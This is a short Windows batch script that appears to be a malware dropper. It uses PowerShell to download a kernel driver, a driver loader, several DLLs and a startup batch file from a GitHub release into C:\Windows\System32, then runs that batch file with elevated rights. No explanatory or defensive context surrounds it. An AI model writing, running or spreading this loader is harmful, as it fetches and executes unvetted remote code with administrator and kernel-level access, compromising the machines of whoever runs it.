@echo off
set "FOLDER=C:\Windows\System32"

:: Create the folder (if needed, though System32 already exists)
powershell -Command "New-Item -ItemType Directory -Path '%FOLDER%' -Force | Out-Null"

:: Download files
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/driver.sys' -OutFile '%FOLDER%\driver.sys'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/DrvLdr.exe' -OutFile '%FOLDER%\DrvLdr.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/drv64.dll' -OutFile '%FOLDER%\drv64.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/startup.bat' -OutFile '%FOLDER%\startup.bat'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/dark-cloud6666/API_callbacktest/releases/download/sfdsgs/Taigei64.dll' -OutFile '%FOLDER%\Taigei64.dll'"

:: Run startup.bat as admin
powershell -Command "Start-Process '%FOLDER%\startup.bat' -WorkingDirectory '%FOLDER%' -Verb RunAs"